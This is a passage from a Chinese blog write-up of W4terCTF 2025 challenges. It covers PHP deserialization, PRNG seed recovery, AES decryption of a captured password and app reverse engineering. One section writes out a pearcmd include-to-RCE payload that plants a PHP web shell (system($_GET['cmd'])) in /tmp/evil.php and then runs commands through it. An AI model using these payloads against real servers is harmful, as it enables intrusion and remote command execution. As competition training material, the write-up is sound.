class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpis</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$what</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$this</span>-&gt;fun1) )&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$this</span>-&gt;fun2)) &#123;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$this</span>-&gt;fun1(<span class="subst">$this</span>-&gt;fun2());&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>) == <span class="string">&#x27;Yelia&#x27;</span>)&#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;what-&gt;<span class="title function_ invoke__">saying</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;nonono ,please try again !!&quot;</span>);</span><br><span class="line">                &#125;            </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">thebest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gogogo</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">language</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$piece1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">right</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$right</span> = <span class="keyword">new</span> <span class="title function_ invoke__">right</span>();</span><br><span class="line"><span class="variable">$right</span>-&gt;sy = [<span class="number">1</span>];</span><br><span class="line"><span class="variable">$right</span>-&gt;su = [<span class="number">2</span>]; </span><br><span class="line"></span><br><span class="line"><span class="variable">$lang</span> = <span class="keyword">new</span> <span class="title function_ invoke__">language</span>();</span><br><span class="line"><span class="variable">$lang</span>-&gt;v1 = <span class="string">&quot;flag=&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="number">666</span>);</span><br><span class="line"><span class="variable">$lang</span>-&gt;piece1 = <span class="variable">$right</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phpis</span> = <span class="keyword">new</span> <span class="title function_ invoke__">phpis</span>();</span><br><span class="line"><span class="variable">$phpis</span>-&gt;what = <span class="variable">$lang</span>;</span><br><span class="line"><span class="variable">$phpis</span>-&gt;fun1 = <span class="string">&quot;strlen&quot;</span>; </span><br><span class="line"><span class="variable">$phpis</span>-&gt;fun2 = <span class="string">&quot;strrev&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$best</span> = <span class="keyword">new</span> <span class="title function_ invoke__">thebest</span>();</span><br><span class="line"><span class="variable">$best</span>-&gt;gogogo = <span class="variable">$phpis</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$best</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;payload：\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//payload: ?gogogo=O%3A7%3A%22thebest%22%3A1%3A%7Bs%3A6%3A%22gogogo%22%3BO%3A5%3A%22phpis%22%3A3%3A%7Bs%3A4%3A%22what%22%3BO%3A8%3A%22language%22%3A2%3A%7Bs%3A2%3A%22v1%22%3Bs%3A37%3A%22flag%3Dfae0b27c451c728867a567e8c1bb4e53%22%3Bs%3A6%3A%22piece1%22%3BO%3A5%3A%22right%22%3A2%3A%7Bs%3A2%3A%22sy%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A2%3A%22su%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7D%7D%7Ds%3A4%3A%22fun1%22%3Bs%3A6%3A%22strlen%22%3Bs%3A4%3A%22fun2%22%3Bs%3A6%3A%22strrev%22%3B%7D%7D    </span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503204222.png" alt="微信图片_20250503204222"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag_piece_1: W4terCTF&#123;i5_pHp</span><br></pre></td></tr></table></figure>

<h3 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h3><p>进到 &#x2F;1nCLud3.php 目录下</p>
<p>根据源码，需要构造参数file，同时又要绕过正则匹配。试了很多种绕过都不太行，虽然$_SERVER[‘QUERY_STRING’]在匹配的时候不会进行url解码，但是同样include打开文件的时候也不会进行url解码，试图构造用url编码方式绕过正则匹配的方式就行不通。</p>
<p>根据提示：register_argc_argv&#x3D;On，找到博客[register_argc_argv与include to RCE的巧妙组合 - Longlone’s Blog](<a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a> to RCE的巧妙组合&#x2F;)</p>
<p>和这道题的思路非常像，所以仿照博客中的解题思路，利用pearcmd执行rce：</p>
<p>“当我们include一个可以被php解析的文件的时候,php代码会被自动执行,这样在registerargcargv开启的情况下我们就有可能通过包含pearcmd.php与操控$_SERVER[‘argv’]来执行pear命令。”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=pearcmd&amp;+config-create+/&lt;?phpsystem($_GET[&#x27;cmd&#x27;]);?&gt;+/tmp/evil.php</span><br></pre></td></tr></table></figure>

<p>因为浏览器会将&lt; ? &gt; 转义，所以通过burpsuite抓包后再GET传参</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504135809.png" alt="微信图片_20250504135809"></p>
<p>这便拿到了cmd的控制权，随后查找剩下的flag</p>
<p>通过include打开evil.php继续利用cmd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/tmp/evil&amp;cmd=ls /tmp</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504140529.png" alt="微信图片_20250504140529"></p>
<p>再配合通配符绕过一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/tmp/evil&amp;cmd=cat /tmp/f*lag2.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504140829.png" alt="微信图片_20250504140829"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag_piece2: _The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: W4terCTF&#123;i5_pHp_The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Front-End"><a href="#Front-End" class="headerlink" title="Front End"></a>Front End</h2><p>密码的web题</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504155416.png" alt="微信图片_20250504155416"></p>
<p>base64编码</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504155524.png" alt="微信图片_20250504155524"></p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504155559.png" alt="微信图片_20250504155559"></p>
<p>打开 &#x2F;hint.html</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504155659.png" alt="微信图片_20250504155659"></p>
<p>看到注释——JavaScript 混淆表达式。在控制台运行一下，得到encode.php</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504155944.png" alt="微信图片_20250504155944"></p>
<p>来到密码的部分</p>
<p>根据</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504160243.png" alt="微信图片_20250504160243"></p>
<p>这一部分的判断逻辑，如果变量 rand 等于0 就输出加密后的内容。</p>
<p>根据 rand 的定义，传递参数 r &#x3D; 1537101982</p>
<p>得到了调用两次encrypt的加密结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Encrypted: 253430495677694834376a30334d7643476e42466b36457a5672714649736d326b626d4c33666f4b6e546c7a324c583857396331543079 </span><br><span class="line">Encrypted: 4f59355430674b38334631497243574c6b58394d46486d706d4249384b5a3230344d4c776d476a5431585a64774f5852747a507779</span><br></pre></td></tr></table></figure>

<p>而在php语言中，mt_rand()生成随机数的方式一般是根据时间戳，如果固定了种子，调用mt_srand(seed)后，mt_rand()生成的随机数序列是不变的。可以得出第一次调用 mt_rand()得到的值等于r，即 1537101982。</p>
<p>网上查阅资料可知，可从生成的随机数序列倒推种子。运行脚本后得到：</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504160818.png" alt="微信图片_20250504160818"></p>
<p>得出了几个满足条件的种子，正向地用这些种子生成随机数序列</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$seeds</span> = [<span class="number">997887998</span>, <span class="number">1741048634</span>, <span class="number">2753486577</span>, <span class="number">3026673652</span>, <span class="number">4268323880</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$seeds</span> <span class="keyword">as</span> <span class="variable">$seed</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Seed: <span class="subst">$seed</span>\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);  </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$rand1</span> = <span class="title function_ invoke__">mt_rand</span>();  </span><br><span class="line">    <span class="variable">$rand2</span> = <span class="title function_ invoke__">mt_rand</span>();  </span><br><span class="line">    <span class="variable">$rand3</span> = <span class="title function_ invoke__">mt_rand</span>();  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;rand1: <span class="subst">$rand1</span>, rand2: <span class="subst">$rand2</span>, rand3: <span class="subst">$rand3</span>\n&quot;</span>;</span><br><span class="line">    <span class="variable">$seed_enc</span> = <span class="variable">$rand2</span> + <span class="variable">$rand3</span> * <span class="number">1000000000</span>;  <span class="comment">//得到加密中需要使用的种子</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Seed Encrypted: <span class="subst">$seed_enc</span>\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Seed Encrypted: 656981344086716842</span></span><br><span class="line"><span class="comment">//Seed Encrypted: 139121407568507466</span></span><br><span class="line"><span class="comment">//Seed Encrypted: 1604674039149147684</span></span><br><span class="line"><span class="comment">//Seed Encrypted: 1782694585991376243</span></span><br><span class="line"><span class="comment">//Seed Encrypted: 1520982203885732553</span></span><br></pre></td></tr></table></figure>

<p>最后再根据原文的加密逻辑倒推flag：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$chars</span>     = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@!&quot;</span>;</span><br><span class="line"><span class="variable">$chars_map</span> = <span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$chars</span>));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$encrypted_text</span>, <span class="variable">$seed</span>, <span class="variable">$chars</span>, <span class="variable">$chars_map</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//$encrypted_text = urldecode($encrypted_text);//url解码</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span>  = <span class="variable">$encrypted_text</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$nh</span>  = <span class="title function_ invoke__">strpos</span>(<span class="variable">$chars</span>, <span class="variable">$ch</span>);<span class="comment">//首字符的位置确定rand()产生的随机数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nh: <span class="subst">&#123;$nh&#125;</span>\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$encrypted_body</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$encrypted_text</span>, <span class="number">1</span>);<span class="comment">//实际加密数据</span></span><br><span class="line">	</span><br><span class="line">    <span class="comment">//根据加密逻辑倒推</span></span><br><span class="line">    <span class="variable">$mdKey_full</span> = <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$seed</span> . <span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$start</span>      = <span class="variable">$nh</span> % <span class="number">8</span>;</span><br><span class="line">    <span class="variable">$length</span>     = <span class="variable">$start</span> + <span class="number">7</span>;           </span><br><span class="line">    <span class="variable">$mdKey</span>      = <span class="title function_ invoke__">substr</span>(<span class="variable">$mdKey_full</span>, <span class="variable">$start</span>, <span class="variable">$length</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$k</span>    = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$tmp</span>  = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$keyL</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$mdKey</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$encrypted_body</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span>       = <span class="variable">$encrypted_body</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$k</span>       = <span class="variable">$k</span> % <span class="variable">$keyL</span>;</span><br><span class="line">        <span class="variable">$ci</span>      = <span class="variable">$chars_map</span>[<span class="variable">$c</span>];</span><br><span class="line">        <span class="comment">// j = (ci - nh - ord(mdKey[k])) mod 64</span></span><br><span class="line">        <span class="variable">$j</span>       = (<span class="variable">$ci</span> - <span class="variable">$nh</span> - <span class="title function_ invoke__">ord</span>(<span class="variable">$mdKey</span>[<span class="variable">$k</span>]) + <span class="number">64</span>*<span class="number">2</span>) % <span class="number">64</span>;</span><br><span class="line">        <span class="variable">$tmp</span>    .= <span class="variable">$chars</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$k</span>++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$seed</span>    = <span class="string">&#x27;1782694585991376243&#x27;</span>;<span class="comment">//手动更换计算得到的seed，wp为正确的seed</span></span><br><span class="line"><span class="variable">$cipher1</span> = <span class="string">&quot;OY5T0gK83F1IrCWLkX9MFHmpmBI8KZ204MLwmGjT1XZdwOXRtzPwy&quot;</span>;</span><br><span class="line"><span class="comment">//这里我已经先将加密的内容从转为转为了字节，并恢复了一些字符即url解码。</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$encoded</span> = <span class="title function_ invoke__">decrypt</span>(<span class="variable">$cipher1</span>, <span class="variable">$seed</span>, <span class="variable">$chars</span>, <span class="variable">$chars_map</span>);</span><br><span class="line"><span class="variable">$flag</span>    = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$encoded</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[+] Decrypted flag: <span class="subst">&#123;$flag&#125;</span>\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可成功解密flag</p>
<p><img src="/2025/05/13/W4terCTF-2025/image-20250504162719128.png" alt="image-20250504162719128"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">W4terCTF&#123;A1b_fROn7EnD_kEep5_8rEwinG&#125;</span><br></pre></td></tr></table></figure>



<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="网站管理员的登录密码"><a href="#网站管理员的登录密码" class="headerlink" title="网站管理员的登录密码"></a>网站管理员的登录密码</h2><p>根据提示需要找到<strong>成功登录</strong>的密码</p>
<p>打开.pcapng，定位POST请求下的login流量包。</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504163434.png" alt="微信图片_20250504163434"></p>
<p>状态显示登陆成功，接下来只需要破解这段密码即可。</p>
<p><img src="/2025/05/13/W4terCTF-2025/image-20250504163921288.png" alt="image-20250504163921288"></p>
<p>找到了密码的加密方式，用一个密钥和一个初始向量，AES加密</p>
<p>对应地写个解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密密钥和初始向量</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</span>)</span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密后的密文（Base64 编码）</span></span><br><span class="line">encrypted_text = <span class="string">&quot;gBjV3cE/UXEm7fXGXbQ4O7bXJEwi0y68SGNjkhuV2RW43lkkKm+xNQzpJDlfgCFOoAvOd0Ff1bg3Je4zbAAEdWpe8DmRdf5wH2F9vhAuDpg=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 Base64 编码的密文解码为字节</span></span><br><span class="line">encrypted_bytes = base64.b64decode(encrypted_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 AES 解密器</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密并去除填充</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    decrypted_bytes = cipher.decrypt(encrypted_bytes)</span><br><span class="line">    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的文本:&quot;</span>, decrypted_text)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密失败:&quot;</span>, e)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/13/W4terCTF-2025/image-20250504164403519.png" alt="image-20250504164403519"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: W4terCTF&#123;Fr0N73Nd!_17&#x27;5_my_5ymM3trlC_3ncrYpt1On!!!!!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="和谐小APP"><a href="#和谐小APP" class="headerlink" title="和谐小APP"></a>和谐小APP</h2><p>参考了这篇博客：<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1973595-1-1.html">鸿蒙逆向 - SHCTF - Android？Harmony！题解 - 吾爱破解 - 52pojie.cn</a></p>
<p>先将.hap文件改为.zip后缀解压</p>
<img src="image-20250504164803915.png" alt="image-20250504164803915" style="zoom:50%;" />


<p>找到.abc文件，用abc反编译工具打开。在 entryability 下定位到 W4terCTF：</p>
<p><img src="/2025/05/13/W4terCTF-2025/image-20250504165220376.png" alt="image-20250504165220376"></p>
<p>这段反编译的结果大致是说，如果 trim &#x3D;&#x3D; “flag”，trim2 &#x3D;&#x3D;”W4terCTF{…}”，就会触发彩蛋。而彩蛋是从“libentry.so”中导入的guessWhat函数在 输入是trim2，种子是20250428 的条件下生成的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">orz = import &#123; default as orz &#125; from &quot;@normalized:Y&amp;&amp;&amp;libentry.so&amp;&quot;;</span><br><span class="line">obj4.message = orz.guessWhat(trim2, 20250428);</span><br></pre></td></tr></table></figure>

<p>那么就定位到 libentry.so 文件。用 IDA 打开，定位到guesswhat函数</p>
<p><img src="/2025/05/13/W4terCTF-2025/image-20250504170855720.png" alt="image-20250504170855720"></p>
<p>找到了函数的实际入口地址，F5一下，反编译代码主要逻辑如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">napi_get_value_string_utf8</span>(a1, v18, s1, 128LL, v13);<span class="comment">//字符串</span></span><br><span class="line"><span class="title function_">napi_get_value_double</span>(a1, *((_QWORD *)&amp;v18 + <span class="number">1</span>), &amp;v12);<span class="comment">//数字</span></span><br><span class="line">                      </span><br><span class="line"><span class="comment">//对传入的两个参数进行一些变换</span></span><br><span class="line">v4 = <span class="number">5</span> * (int)v12;</span><br><span class="line">  v5 = <span class="number">15</span> * (int)v12;</span><br><span class="line">  v6 = <span class="number">20</span> * (int)v12;</span><br><span class="line">  v7 = <span class="number">10</span> * (int)v12;</span><br><span class="line">  <span class="keyword">for</span> ( i = 0LL; ; i += 20LL )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)((char *)s1 + i) ^= v3;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">0x77</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_DWORD *)((char *)s1 + i + <span class="number">5</span>) ^= v4 + v3;</span><br><span class="line">    *(_DWORD *)((char *)s1 + i + <span class="number">10</span>) ^= v7 + v3;</span><br><span class="line">    *(_DWORD *)((char *)s1 + i + <span class="number">15</span>) ^= v5 + v3;</span><br><span class="line">    v3 += v6;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最后判断变换后的变量是否与target相等</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">bcmp</span>(s1, &amp;target, <span class="number">0x80</span>))</span><br><span class="line">    v8 = &amp;unk_910;  <span class="comment">// 成功提示</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    v8 = &amp;unk_91C;  <span class="comment">// 失败提示</span></span><br></pre></td></tr></table></figure>

<p>所以下面就是要去找到 target</p>
<p><img src="/2025/05/13/W4terCTF-2025/image-20250504172003259.png" alt="image-20250504172003259"></p>
<p>提取出target的所有字节，并基于上面的变换逻辑恢复出flag即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">target_bytes = <span class="built_in">bytes</span>([</span><br><span class="line">    <span 